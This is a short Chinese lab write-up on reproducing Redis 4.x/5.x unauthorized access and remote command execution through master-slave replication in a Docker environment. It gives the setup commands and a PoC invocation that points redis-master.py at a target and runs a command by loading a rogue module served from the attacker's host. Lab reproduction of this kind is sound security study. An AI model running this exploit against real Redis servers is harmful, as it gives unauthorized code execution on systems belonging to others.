# Redis 4.x/5.x 主从复制导致的命令执行

## 环境搭建

执行如下命令启动redis 4.0.14：

```plain
docker compose up -d
```

环境启动后，通过redis-cli -h your-ip即可进行连接，可见存在未授权访问漏洞。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780898293415-f539eacc-3273-4a06-b507-4a5686587231.png)

## 漏洞复现

使用[这个POC](https://github.com/vulhub/redis-rogue-getshell#tdsub)即可直接执行命令：

```plain
cd RedisModulesSDK/
make
python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "id"
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780898294374-bd5368ef-ca47-4315-a7e9-2d3243e1fa5e.png)